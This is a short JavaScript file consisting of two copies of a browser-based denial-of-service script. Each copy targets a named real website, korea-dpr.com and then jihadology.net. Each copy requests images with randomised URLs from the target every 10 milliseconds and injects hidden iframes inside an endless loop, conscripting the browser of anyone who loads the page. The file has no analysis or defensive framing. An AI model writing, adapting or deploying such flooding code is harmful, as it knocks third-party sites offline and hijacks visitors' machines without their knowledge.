function imgflood() {  
  var TARGET = 'korea-dpr.com';
  var URI = '/index.html';
  var pic = new Image();
  var rand = Math.floor(Math.random() * 1000);
  pic.src = 'http://'+TARGET+URI+rand+'=val';
}
setInterval(imgflood, 10);

function _DDoS(url){
 document.body.innerHTML+='<iframe src="'+url+'" style="display:none;"></iframe>';
}
for(;;){
 setTimeout(_DDoS("http://korea-dpr.com/"),10);
}



function imgflood() {  
  var TARGET = 'jihadology.net';
  var URI = '/index.html';
  var pic = new Image();
  var rand = Math.floor(Math.random() * 1000);
  pic.src = 'http://'+TARGET+URI+rand+'=val';
}
setInterval(imgflood, 10);

function _DDoS(url){
 document.body.innerHTML+='<iframe src="'+url+'" style="display:none;"></iframe>';
}
for(;;){
 setTimeout(_DDoS("http://jihadology.net"),10);
}
